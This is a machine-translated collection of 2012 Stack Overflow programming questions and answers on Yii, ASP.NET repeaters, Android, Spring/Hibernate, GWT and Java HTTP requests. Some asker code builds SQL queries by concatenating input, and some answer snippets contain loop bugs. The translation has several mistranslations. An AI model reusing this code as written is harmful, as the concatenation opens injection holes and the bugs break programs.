> 赞同：1
> 
> 时间：2012-07-03T10:36:21.547
> 
> 标签：php, internationalization, event-handling, yii

好吧`components`，我的配置文件中有这样的配置

```
'components'=>array(

        'messages' => array(
            'onMissingTranslation' => array('MissingTranslation','handler'),
        ),
); 
```

现在这是我的`MissingTranslation`课

```
class MissingTranslation extends CApplicationComponent{

    public function handler($event){
        $msg= $event->message;

    }

} 
```

现在我通过使用`Yii:t("hello");`“hello”中的 where 来测试它根本没有任何翻译。这会产生一个错误

> call_user_func() 期望参数 1 是一个有效的回调，非静态方法 MissingTranslation::handler() 不应被静态调用

我删除了`onMissingTranslation`事件处理程序，它工作正常，所以我怀疑事件处理程序有问题。

这是否已经是 Yii 的一个错误？还是我又做了坏事？

**更新**

这是Yii的回答

[https://github.com/yiisoft/yii/issues/902#issuecomment-6732258](https://github.com/yiisoft/yii/issues/902#issuecomment-6732258)

我希望这对遇到同样问题的人有所帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T15:42:47.273

当您扩展 a`class`并使用一个类而不创建一个时，`Instance`或者`Object`您需要将其标记为静态，以便其属性和方法变得可见。

# c# - 在嵌套中继器控件中显示数据以及如何使用 asp.net 将值 parentID 从父中继器传递到子中继器

> ID：11309130
> 
> 赞同：0
> 
> 时间：2012-07-03T10:36:26.250
> 
> 标签：c#, asp.net, repeater, webforms, nested-repeater

![相片集](../Images/eda50ce5df2086055855166d8eb5fdae.png) 我必须显示图片中的照片库。我将照片库的信息存储在 4 个不同的表中。我需要在主页上显示 CategoryName 和专辑以及它们受人尊敬的图标并将它们链接到 AlbumCategoryPage.aspx。

为了实现这一点，我正在使用嵌套中继器控件。

Parent Repeater 将显示类别图像（以红色显示），然后显示同一类别中的前 4 个专辑，依此类推。

到目前为止，我已经这样做了

```
 <asp:Repeater ID="rptAlbumCategory" runat="server" OnItemDataBound="rptAlbumCategory_ItemBound">
                <ItemTemplate>
                        <!-- Repeated data -->
                        <div class="AlbumRowWrapper">
                            <div id="dAlbumCategory" class="AlbumCategoryIcon">
                                <asp:Image ID="Image1" ImageUrl='<%# getImagePath(Eval("CategoryImage")) %>' runat="server" />
                            </div>
                        </div>
                        <asp:Repeater ID="rptAlbums" runat="server" >
                            <ItemTemplate>
                                <!-- Nested repeated data -->
                            </ItemTemplate>
                        </asp:Repeater>
                    </ItemTemplate>
            </asp:Repeater> 
```

**代码背后**

页面加载时

```
 protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {     //Get Gallery
            DataSet dsAlbumCat = new DataSet();
            string strSql = "SELECT * FROM AlbumCategory)";
            dsAlbumCat = DataProvider.Connect_Select(strSql);
            rptAlbumCategory.DataSource = dsAlbumCat;
            rptAlbumCategory.DataBind();
}
}

protected void rptAlbumCategory_ItemBound(Object Sender, RepeaterItemEventArgs e)
{

if (e.Item.ItemType == ListItemType.Item)
{
    Repeater childRepeater = (Repeater)e.Item.FindControl("rptAlbumCategory");
   // childRepeater.DataSource = getAlbums();
   // childRepeater.DataBind();
}

}

protected void getAlbums()
{
    DataSet dsAlbums = new DataSet();
    string strSql = "SELECT * FROM AlbumName WHERE CategoryID = " + CategoryID + ")";
    dsAlbums = DataProvider.Connect_Select(strSql);
    rptAlbums.DataSource = dsAlbums;
    rptAlbums.DataBind();
}

protected String getImagePath(object img)
{
    string url;
    url = "~/Images/gallery/" + img;

    return url;
} 
```

使用此代码，我可以获得以下结果。 ![在此处输入图像描述](../Images/2bf7438be70299d798dc8490640cabbd.png)

我不确定如何将 CategoryID 从父转发器传递给子转发器，以便它向我显示相关专辑。

我第一次使用嵌套中继器并发现它令人困惑，因为我找不到与我的场景相关的完整示例

表结构

```
TABLE AlbumCategory
CategoryID
CategoryName
CategoryImageIcon
CategoryVisible
LanguageID

TABLE AlbumName
AlbumID
AlbumName
AlbumDescription
AlbumImageIcon
CategoryID
LanguageID 
```

我将不胜感激在这方面的帮助，甚至是完成与第一张图片中显示的相同设计的最佳方法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:34:46.027

尝试这个

```
 Dim ds As DataSet = getCategoriesAndName()
    ds.Relations.Add("relation_category", ds.Tables(0).Columns("CategoryID"), ds.Tables(1).Columns("CategoryID"))
    rptAlbumCategory.DataSource = ds
    rptAlbumCategory.DataBind() 
```

getCategoriesAndName() 将返回具有两个数据表（类别和名称）的数据集。然后上

```
 Protected Sub rptAlbumCategory_ItemDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.RepeaterItemEventArgs) Handles rptAlbumCategory.ItemDataBound
   Dim rptrAlbums As Repeater = TryCast(e.Item.FindControl("rptrAlbums"), Repeater)
   rptrAlbums.DataSource = TryCast(e.Item.DataItem, DataRowView).CreateChildView("relation_category")
   ' Bind the child repeater  
   rptrAlbums.DataBind()
 End Sub 
```

我认为这更容易:-)

# asp.net - 如何将数据行设置为字符串数组？

> ID：11309134
> 
> 赞同：0
> 
> 时间：2012-07-03T10:36:38.457
> 
> 标签：asp.net, arrays, datarow

我有一个数据表，我在其上应用**Select()**方法。之后，我想将结果放入一个字符串数组中。我已经尝试了以下代码，但它不起作用。请让我知道确切的解决方案。

```
 DataTable dtget = HttpContext.Current.Cache["Hello"] as DataTable; 
    string sqlFilter = "Securityid = '" + CommonClass.Encryptdata(txtSecurity.Text) + "'";
    DataRow[] dr = dtget.Select(sqlFilter);
    if (dr.Length > 0)
    {
        String[] Con;
        for (int i = 0; i <= dr.Length; i++)
        {
            dr[i] = dr[i].ToString();

        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:38:53.987

您必须创建`List<T>`.

像这样的东西：

```
 List<String[]> list=new List<String[]>();

   if (dr.Length > 0)
    {
        for (int i = 0; i < dr.Length; i++)
        {
            string []ar=new string[dtget.Columns.Count];
            for(int j=0;j<dtget.Columns.Count;j++)
             {
              ar[j]=dr[i][j].ToString();
             }
             list.Add(ar);
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:43:41.340

您已经声明了数组，但没有实例化它。而且您也没有向实际数组写入任何内容，而是试图直接写回数据表。

```
String[] Con= new String[dtget.Columns.Count]; 
for (int i = 0; i <= dr.Length; i++) 
{ 
    Con[i] = dr[i].ToString(); 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T10:43:58.440

问题是您将值分配给 datarrow 而不是您的字符串数组。改变

```
dr[i] = dr[i].ToString(); 
```

到

```
con[i] = dr[i].ToString(); 
```

你也错过了 Con 的新声明：

```
Con = new String[dr.Table.Columns.Count]; 
```

请注意，没有 dr.Length 这样的东西，您必须检查列数：

```
dr.Table.Columns.Count 
```

最后，您可能应该将字符串数组定义向上移动，以便在 IF 之外可用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T10:50:40.700

根据您的需要，您可以使用 Datarow 的 ItemArray 属性。它是一个对象数组而不是字符串数组，但在使用它的值之前，您可以执行“ToString()”，一切就绪。

```
string a = dr.ItemArray[i].ToString(); 
```

# git - git 或 mercurial 可以分散/收集吗？

> ID：11309137
> 
> 赞同：1
> 
> 时间：2012-07-03T10:36:44.817
> 
> 标签：git, windows-7, mercurial

我在 Windows 7 PC 上的不同位置都有重要的配置文件。我想将这些保留在版本控制中并将它们复制到我的其他 PC。

我是否可以使用 git 或 mercurial 将它们全部保存在一个存储库中，即使它们位于我 PC 上的不同位置？

如果这是一个 Linux 机器，我会将它们全部放在一个文件夹中并使用符号链接。由于这是 Windows，因此这是不可能的。

那么：我是否可以（以某种方式）配置 git 或 mercurial 以在提交或推送时将文件“收集”在一起，并在拉取或更新时将文件“分散”到正确的目的地？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T20:56:31.453

考虑将部署与版本控制分开。如果您在版本控制下的文件必须在可以使用之前进行处理（例如复制到它们的最终位置），您可能会发现这为您提供了更多选择。

不，两者都不能为您进行部署。

不过，您可以使用 Git 中的 post-receive 挂钩（如果您可以在 Windows 上运行）自动将文件从您推送到部署系统的提交中复制。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:45:24.693

在 Windows 上，您还可以使用符号链接：

```
C:>mklink /?
Creates a symbolic link.

MKLINK [[/D] | [/H] | [/J]] Link Target

    /D      Creates a directory symbolic link.  Default is a file
            symbolic link.
    /H      Creates a hard link instead of a symbolic link.
    /J      Creates a Directory Junction.
    Link    specifies the new symbolic link name.
    Target  specifies the path (relative or absolute) that the new link
            refers to. 
```

# android - 为什么我的听众会触发快乐

> ID：11309139
> 
> 赞同：1
> 
> 时间：2012-07-03T10:36:47.310
> 
> 标签：android, triggers, listeners

现在我知道添加侦听器，然后设置字段会触发更改。所以我设置我的字段然后添加监听器。

我什至在触发时添加了一个布尔值，以避免这种情况。但是在 OnResume 之后。我所有的听众都在发火。有人可以解释为什么，以及如何阻止它。谢谢。

这是我的代码/工作流程：

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

   spn1.setSelection(2);
   spn2.setSelection(15); // Gets replaced by the listener to 2, when it shouldnt!

   UseListeners = false; // Ignores fired events with an IF statement.

   addListeners();

   //UseListeners = true;
}

@Override
protected void onResume() {
    super.onResume();   
    UseListeners = true;
}

private void addListeners() {  
    spn1.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
        @Override
        public void onItemSelected(AdapterView<?> parentView, View selectedItemView, int position, long id) {
            try{
                if(UseListeners){                       
                    spn2.setSelection(spn1.getSelectedItemPosition());                      
                }
            } catch (Exception e)
            {
            }
        }
        @Override
        public void onNothingSelected(AdapterView<?> arg0) {            
        }
    }); 
 } 
```

当然在 OnResume 之后，什么都没有改变，所以它不应该被触发。从字面上看，简历只是将布尔值设置为真。这是应用程序运行之前的最后一个状态，所以我不确定它在哪里以及为什么会触发。它的 Super 在被允许使用触发器之前被调用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:49:28.257

我认为在创建布局后调用侦听器。看起来创建视图是在`onPause()`方法之后的某个时间点发生的，因此在设置布尔标志时`onPause()`应该在侦听器中设置它。

见[这里](https://stackoverflow.com/questions/5624825/spinner-onitemselected-executes-when-it-is-not-suppose-to/5918177#5918177)和[这里](https://stackoverflow.com/q/2562248/265597)。

# php - 在一个页面中选择一个复选框 使用 php,javascript 在另一个页面中自动选择

> ID：11309148
> 
> 赞同：0
> 
> 时间：2012-07-03T10:37:14.003
> 
> 标签：php, javascript, html

我设计了 2 个 html 页面，在这里我为 2 个页面中的复选框找到了一些相同的代码。我想要这个，当我在第一页中选择复选框时，然后在第二页中自动选择相同的复选框。我该怎么做?

我在 2 页中的 chk 框代码

您想让其他人可以复制吗？

是
否

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:56:59.603

让它成为您的 html 表单。

```
<form action="your/action" method="POST" name="form">
      <input type="checkbox" name="postCheckBox" value=""/>
<input type="submit" value="submit"/>
</form> 
```

在 /your/action.php 页面

```
$_SESSION['postCheckBox'] = isset($_POST["postCheckBox"]) ? $_POST["postCheckBox"] : null; 
```

在您的下一个 html 页面中：

```
<input type="checkbox" name="somename" <?php echo isset($_SESSION['postCheckBox']) && $_SESSION['postCheckBox'] == 1 ? 'checked="true": ""' ?>value=""/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:41:33.497

我相信最简单的方法是在会话中添加一个值并在另一页上阅读它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-29T09:52:29.607

```
Checkbox will select automatically perticular checkboxes from selected price list of home page.

    $("input[name=categories]").each( function (index) {    
        iterations = $.cookie('total_iterations');

        var orgval = $(this).val();
        for (var i = 1; i <= iterations; i++) {
            var chkval =$.cookie("plan_item_cookie_cb_"+i);
            if(chkval.trimRight() == orgval )
            {
                $(this).prop('checked', true);
            }
       };
    });

    $('#plan_section_id_1').click(function(){
        var cookies = $.cookie();
        for(var cookie in cookies) {
           $.removeCookie(cookie);
        }

        var count=0;
        //alert('outside');
        $('#plan_section_id_1').find('input[type="hidden"]').each(function(){
            //alert('in');
            its = $('#plan_section_id_1 .total_iterations').val();
            if ($(this).val().length) {
            //if ($.trim($(this).val()).length) {
                count++;
                $.cookie('plan_item_cookie_cb_'+count,decodeURI($(this).val()),60);
                //$.cookie('section-id','plan_section_id_1');
                $.cookie('total_iterations',its);
            }
        });
    });

    $('#plan_section_id_2').click(function(){
        var cookies = $.cookie();
        for(var cookie in cookies) {
           $.removeCookie(cookie);
        }

        var count=0;
        $('#plan_section_id_2').find('input[type="hidden"]').each(function(){
            its = $('#plan_section_id_2 .total_iterations').val();
            if ($(this).val().length) {
            //if ($.trim($(this).val()).length) {
                count++;
                $.cookie('plan_item_cookie_cb_'+count,decodeURI($(this).val()),60); 
                $.cookie('total_iterations',its);
            }
        });

    });

    $('#plan_section_id_3').click(function(){
        var cookies = $.cookie();
        for(var cookie in cookies) {
           $.removeCookie(cookie);
        }
        var count=0;
        $('#plan_section_id_3').find('input[type="hidden"]').each(function(){
            its = $('#plan_section_id_3 .total_iterations').val();
            if ($(this).val().length) {
            //if ($.trim($(this).val()).length) {
                count++;
                $.cookie('plan_item_cookie_cb_'+count,decodeURI($(this).val()),60);
                $.cookie('total_iterations',its);
            }
        });

    }); 
```

# php - php 类关系以及如何扩展类

> ID：11309149
> 
> 赞同：0
> 
> 时间：2012-07-03T10:37:15.813
> 
> 标签：php, oop, class

我的查询是关于类的体系结构和关系，我想知道比我实现的更好的解决方案。

我有 4 节课，每节课解释一行

1.  core.php 类，它将具有所有常用功能
2.  A.php 类文件，其中包含任务 A 的特定功能，例如在 csv 文件 A 上写入。
3.  B.php 类文件，其中包含任务 B 的特定功能，例如编写另一个与 csv A 完全不同的 csv 文件。
4.  X.php 类是另一个特定于任务的类。

现在来到将使用所有 4 个类的通用脚本。所以我不明白哪个类将扩展另一个类

A.php 和 B.php 之间没有关系

但是 x.php 必须使用所有 3 个类 core.php、A.php 和 B.php。

目前我所做的，我为核心类设计了一个接口，x.php扩展了核心类并实现了接口。我将 A.php 和 B.php 设计为静态类。

请指导

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T10:46:10.137

如果它们彼此无关，*您* 不必上课。`extend`您可以简单地在另一个类中*使用一个类，而这两个类没有任何关系继承或接口方式。*

您可以像这样构造它：

*   `class Common`是您的*基类*，每个类都继承自并包含所有类需要的公共代码，例如用于日志记录或数据库访问的代码。
*   `class A extends Common`并且专门用于一些与 CSV 相关的任务。这个类可能会或可能不会自己做任何事情。
*   `class B extends A`并且更专业于涉及 CSV 的某些特定任务。
*   `class X extends Common`又是其他一些任务。

通常，如果一个类的功能几乎相同，但稍微更专业或不同，则`extend`使用通用基类。如果一个类与另一个类没有任何共同之处，只需将它们设为独立类即可。用于`interfaces`多态性；这听起来不像你现在需要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T10:48:09.177

这听起来像是基本的依赖管理。我不明白你为什么明确想要扩展任何东西？

您可能应该做的是注入所需的依赖项。在实例`Core`化它所依赖的对象`A`之前`B`分别实例化。`X`

# android - 如何将图像上传到android中的sqlite db并查看它？

> ID：11309152
> 
> 赞同：0
> 
> 时间：2012-07-03T10:37:19.870
> 
> 标签：android

我是android开发的初学者。我想制作一个照片共享应用程序，这样一旦应用程序安装在 android 设备上，用户就可以上传他/她的图像。我看过很多例子，但对我没有用。请帮助我是新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T10:40:18.357

在数据库中存储图像是一个糟糕的解决方案。

最好的方法是将图像存储到手机文件系统中，同时将文件路径存储在 db.xml 中。通过这种方式，您可以获得原始图像文件，查看数据库查询检索到的文件路径。

无论如何，如果您必须将图像保存在数据库中，您可以查看这个有用的教程：

[http://www.helloandroid.com/tutorials/store-imagesfiles-database](http://www.helloandroid.com/tutorials/store-imagesfiles-database)

# jackrabbit - 在 Jackrabbit 存储库之间复制 Lucene 索引

> ID：11309154
> 
> 赞同：7
> 
> 时间：2012-07-03T10:37:37.003
> 
> 标签：jackrabbit, aem, crx

我有两个包含相同内容的 Jackrabbit 实例。重建 Lucene 索引很慢，需要 30 多个小时，而且集群中所需的停机时间是有风险的。是否可以只重新索引一个 Jackrabbit，然后将 Lucene 索引从该实例复制到另一个？

天真地复制工作区目录下的 Lucene 索引文件是行不通的。问题似乎是内容是由映射到 UUID 的文档编号索引的，该 UUID 映射到索引节点的 JCR 路径，但是对于 Jackrabbit 实例之间的给定路径，这些 UUID 不稳定。（两者实际上都是由 CQ 作者实例复制填充的 Day CQ 发布者实例。）

我已经设法在 /jcr:system/jcr:versionStorage/ 下的存储库中找到 UUID 到路径的映射，但是我看不到在存储库之间复制它以及 Lucene 索引的简单方法。然后我在文件中的任何地方都找不到 UUID->document ID 映射 - 这也是 Lucene 索引的一部分吗？

谢谢你的帮助。我倾向于单独重新索引第二个实例并接受停机时间，但任何降低风险的想法或重新索引集群所用的时间都值得赞赏！

* * *

最后，我们将采用 re-index-them-both 路线：我们已经设法将一个测试实例重新定位为一个额外的活动实例，我们可以暂时将其放入农场，同时我们将另外两个依次取出来重新-指数。但是，我仍然有兴趣听到更好的方法来做到这一点！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-09T03:11:51.060

老实说，这似乎是一个可怕的想法。我不确定是否有任何方法可以保证您拥有相同的基础数据，即使具有相同的内容和硬件配置。

如果您的性能数据与我们的相似，则复制整个存储库的时间少于重新索引所需的时间。您是否考虑过仅重新索引一个存储库，进行备份/复制，然后将备份/复制配置为您的第二个实例？

# spring - Spring 3 + LazyInitializationException + OpenSessionInViewFilter

> ID：11309155
> 
> 赞同：0
> 
> 时间：2012-07-03T10:37:38.120
> 
> 标签：spring, lazy-initialization

我在使用 Spring 3 时遇到了一些问题，包括注释和休眠。

我试图在将包含在所有其他 JSP 中的 JSP 中执行此操作，它是一个标头。

```
${pageContext['request'].userPrincipal.principal.notifications} 
```

我的用户 pojo 与这样的通知有关系

```
 @OneToMany(mappedBy="user", fetch = FetchType.LAZY)
    protected Collection<Notification> notifications; 
```

如果我从正确注释的控制器或服务中调用 getNotifications，我没有问题，但是当我尝试在 JSP 中执行代码时，我收到了一个像这样的 LazyInitializationException：

```
org.hibernate.LazyInitializationException: failed to lazily initialize a 
     collection of role: org.prog.para.model.pojo.user.User.notifications, no session or 
     session was closed 
```

我阅读了有关 OpenSessionInViewFilter 的信息，但我不知道它为什么不起作用。

我的 web.xml ：

```
<filter>
    <filter-name>OpenSessionInViewFilter</filter-name>
    <filter-class>org.springframework.orm.hibernate3.support.OpenSessionInViewFilter</filter-class>
    <init-param>
        <param-name>singleSession</param-name>
        <param-value>true</param-value>
    </init-param>
</filter>
<filter-mapping>
    <filter-name>OpenSessionInViewFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

<listener>
    <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
</listener>

<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>
        /WEB-INF/spring/app-config.xml
        /WEB-INF/spring/security-config.xml
    </param-value>
</context-param>
<context-param>
    <param-name>defaultHtmlEscape</param-name>
    <param-value>true</param-value>
</context-param>

<servlet>
    <servlet-name>para-mvc</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/spring/mvc-config.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
<servlet-mapping>
    <servlet-name>para-mvc</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping>

<filter>
    <filter-name>springSecurityFilterChain</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
</filter>
<filter-mapping>
    <filter-name>springSecurityFilterChain</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

<filter>
    <filter-name>CharacterEncodingFilter</filter-name>
    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
    <init-param>
        <param-name>encoding</param-name>
        <param-value>UTF-8</param-value>
    </init-param>
    <init-param>
        <param-name>forceEncoding</param-name>
        <param-value>true</param-value>
    </init-param>
</filter>
<filter-mapping>
    <filter-name>CharacterEncodingFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

<servlet-mapping>
    <servlet-name>default</servlet-name>
    <url-pattern>/static/*</url-pattern>
</servlet-mapping> 
```

我的 app-config.xml 文件是：

```
<context:component-scan base-package="org.prog.para">
    <context:exclude-filter expression="org.springframework.stereotype.Controller" type="annotation" />
</context:component-scan>

<!-- Datasource -->
<import resource="ds-config.xml" />

<bean id="sessionFactory"
    class="org.springframework.orm.hibernate3.annotation.AnnotationSessionFactoryBean">
    <property name="dataSource" ref="dataSource" />
    <property name="packagesToScan" value="org.prog.para.model.pojo" />
    <property name="hibernateProperties">
        <props>
            <prop key="hibernate.dialect">org.hibernate.dialect.PostgreSQLDialect</prop>
            <prop key="hibernate.default_schema">schema</prop>
            <prop key="hibernate.show_sql">true</prop>
        </props>
    </property>
</bean>

<bean id="hibernateTransactionManager"
    class="org.springframework.orm.hibernate3.HibernateTransactionManager">
    <property name="sessionFactory" ref="sessionFactory" />
</bean>

<tx:annotation-driven transaction-manager="hibernateTransactionManager"
    proxy-target-class="true" mode="proxy" />

<bean id="emailTemplateResolver" class="org.thymeleaf.templateresolver.ServletContextTemplateResolver">
    <property name="prefix" value="/WEB-INF/views/templates/" />
    <property name="suffix" value=".html" />
    <property name="characterEncoding" value="UTF-8" />
    <property name="order" value="1" />
</bean>

<bean id="templateEngine" class="org.thymeleaf.spring3.SpringTemplateEngine">
    <property name="templateResolvers" ref="emailTemplateResolver" />
</bean>

<bean id="viewResolver" class="org.thymeleaf.spring3.view.ThymeleafViewResolver">
    <property name="templateEngine" ref="templateEngine" />
    <property name="characterEncoding" value="UTF-8" />
</bean>

<bean id="springApplicationContext" class="org.prog.para.config.SpringApplicationContext" /> 
```

有谁知道我的失败在哪里？我不明白为什么在执行视图时我的会话关闭。

我可以将 FetchType.EAGER 放在通知集合上来解决它，但这不是我想要的。我需要它是一个懒惰的关系。

提前致谢 ！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T10:59:51.023

我认为问题可能在于您同时使用`OpenSessionInViewInterceptor`和`OpenSessionInViewFilter`。尝试删除其中之一。

# asp.net - 关于数据导入、后处理和数据呈现。系统流程改进

> ID：11309159
> 
> 赞同：2
> 
> 时间：2012-07-03T10:37:44.823
> 
> 标签：asp.net, .net, sql-server, performance, import

我有一个 ASP.Net 3.5 Web 应用程序。网站和 SQL-Server 都托管在`same server`.

整个系统以Numbers/Data为基础，用户需要将`import`海量数据（如使用excel电子表格）输入系统，系统需要显示计算出来的数字`on screen`并`reports`为用户生成。

目前，在此服务器上运行一个 Import Server 应用程序，将数据插入/更新到`raw data tables`，然后计算数据并将其插入/更新到`post-processed`表中。所有这些过程都涉及`one thread`（可能在一个存储过程中）。

这种设计的缺点是：导入app`costs`占用大量系统资源，需要一个`long time`运行。它`locked`是表格（例如 TRANSACTION）并影响了用户在网站上的操作。此外，计算出的数据难以追踪，容易误算。

我试图`View`在系统中创建一个临时表（）来按需处理数据，而不是将其后处理到计算表中。但我发现处理时间（查看和 SQL 存储过程`execution time`）太长而无法接受（5 分钟或更长时间，某些查询，例如每天`join...between`的`apportion`年度数据需要最多的处理时间）。

希望有经验的人能给我一些建议（或一般策略），关于如何在各个方面改进系统的设计/实现，谢谢。

所有方面包括：多服务器、DBMS、服务器应用程序、Web 服务、SQL Server 优化、SQL 组件、整个系统设计和架构等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T20:53:42.850

所以如果我正确地阅读了这个问题，你曾经有这个：

*   具有原始数据导入+后处理的系统。两组表。
*   Web 应用程序在性能方面受到影响，因为原始数据的后处理非常耗时，并且在 Web 应用程序读取数据的后处理表中引入了锁。

因此，您现在正在尝试以下设置：

*   原始数据被导入一组表。
*   您不是在后处理和存储处理后的数据，而是在视图中“按需”进行后处理。
*   这也没有给出令人满意的表现

尝试使用原始设置的替代版本怎么样？您可以尝试这样的解决方案：

*   制作*三*组表
*   一套用于原始数据导入
*   一组用于存储原始数据后处理结果
*   还有一组用于存储已处理数据的副本。

最后一组表格将用于生成报告。使用此设置，“数据导入”将包括三个步骤：

*   原始数据导入
*   后期处理
*   将处理后的数据更新为“实时”表。

据推测，将处理后的数据从一组表复制到另一组表可以合理地执行。因此，数据导入对 Web 应用程序的影响可以得到控制，因为后处理不会直接接触“实时”表。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T13:32:59.020

您可以尝试以下方式

1st直接将数据导入原始数据表。

然后在代码后面而不是在存储过程中进行计算，这需要大量时间在代码后面执行此操作将节省数据库资源。

完成计算后，将计算值插入计算表。

尽量使用后台代码而不是数据库，只有在后台代码无法完成某些事情时才使用数据库。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-06T14:46:23.070

我看到加入需要一段时间你能确认你有外键吗？另外，如果您向我展示我可能会提供帮助的 SQL。

# android - 将 Android 操作栏与菜单选项卡合并

> ID：11309163
> 
> 赞同：7
> 
> 时间：2012-07-03T10:38:32.257
> 
> 标签：android, android-actionbar

我们正在尝试为 Android 创建一个应用程序。我们想知道是否可以在 potrait 模式下将菜单与操作栏合并，就像 4.0 和 Honeycomb 平板电脑中的横向模式一样（见下面的截图）。

这可能吗？如果是，如何？

![](../Images/03d779aca37b48b40bf952d3e00c2bb8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-12T07:39:32.567

如果要向操作栏添加更多图标，可以添加。

例如：（此 master.xml 必须在菜单文件夹中）

```
<menu xmlns:YourApp="http://schemas.android.com/apk/res-auto"
xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:id="@+id/actionBarFilterItem"
      android:icon="@drawable/crystal_icon_filter"
      android:title="@string/changeFilter"
     YourAPPNAME:showAsAction="always"
   />

        <item android:id="@+id/actionBarSettingsItem"
      android:icon="@drawable/crystal_icon_settings"
      android:title="@string/action_settings"
     YourAPPNAME:showAsAction="always"
   /> 
```

在活动中，您必须将充气机设置为：

```
 @Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.master, menu);

    return super.onCreateOptionsMenu(menu);
} 
```

要设置 onClick 事件，您可以使用：

```
 @Override
public boolean onOptionsItemSelected(MenuItem item) {

    if (mDrawerToggle.onOptionsItemSelected(item)) {
        return true;
    }
    // Handle action buttons
    switch(item.getItemId()) {
    case R.id.actionBarFilterItem:
        //TODO Your action
        return true;
    case R.id.actionBarSettingsItem:
        //TODO Your action
        return true;
    default:
        return super.onOptionsItemSelected(item);
    }
} 
```

祝你好运

# flash - Flash 复制Movieclip 并放置在其他movieclip (AS2)

> ID：11309164
> 
> 赞同：0
> 
> 时间：2012-07-03T10:38:44.650
> 
> 标签：flash, duplicates, actionscript-2, movieclip

出于某种原因，我复制了影片剪辑并尝试将其放入其他影片剪辑中，但它不起作用。在场景中，我得到了 2 个电影剪辑 mc 和 mc2。然后我使用 AS 创建新的影片剪辑，并放置在现有的影片剪辑中，它在 _root 目录中创建它...

这是代码：

```
 duplicateMovieClip(_root.mc, "_root.mc2.name", 1); 
```

有什么帮助吗？:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T14:11:42.163

您不能在 AS2 的不同级别中复制影片剪辑。如果您想多次使用加载的图像，您可以在同一级别复制影片剪辑，或者直接在最终剪辑中根据需要多次加载图像。

如果您可以将图像放入您的库中，您还可以在任何移动剪辑中使用 attachMovie 功能。

# gwt - 在 GWT GRID 或 FLEX TABLE 中将列宽设置为零

> ID：11309167
> 
> 赞同：0
> 
> 时间：2012-07-03T10:38:47.850
> 
> 标签：gwt, grid, width, flextable

我试图在 GWT-GRID 中将列宽设置为零以使其隐藏。我试过

```
grid.GetColumnFormatter().setWidth(0, "0px"); 
```

但是什么也没发生。有没有其他办法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T21:33:13.673

在网格中，无论你使用`FlexTableFormatter()`还是`ColumnFormatter()`，每一列都会占据它的大小。如果你想通过一些像素来限制它，你可以做到这一点。但是您不能将其设为 0。相反，您可以添加特定的列运行时间。

# java - Java 中的 HTTP 响应代码

> ID：11309170
> 
> 赞同：0
> 
> 时间：2012-07-03T10:39:05.110
> 
> 标签：java, url, connection, httpresponse

这是我使用的代码：

```
class ResponseCodeCheck 
{

public static void main (String args[]) throws Exception
{

    URL url = new URL("http://www.amazon.co.jp/gp/seller/sell-your-stuff.html");
    HttpURLConnection connection = (HttpURLConnection)url.openConnection();
    connection.setRequestMethod("GET");
    connection.connect();

    int code = connection.getResponseCode();
    System.out.println("Response code of the object is "+code);
    if (code==200)
    {
        System.out.println("OK");
    }
}
} 
```

当该 URL 工作正常时，它为 URL 提供了 404。有什么理由吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:04:24.510

为“User-Agent”添加适当的标头值

```
connection.addRequestProperty("User-Agent", "Safari"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:02:36.460

`CURL`是说：

```
curl -v http://www.amazon.co.jp/gp/seller/sell-your-stuff.html
* About to connect() to www.amazon.co.jp port 80 (#0)
*   Trying 176.32.120.128... connected
> GET /gp/seller/sell-your-stuff.html HTTP/1.1
> User-Agent: curl/7.23.1 (x86_64-pc-win32) libcurl/7.23.1 OpenSSL/0.9.8r zlib/1.2.5
> Host: www.amazon.co.jp
> Accept: */*
>
< HTTP/1.1 301 MovedPermanently 
```

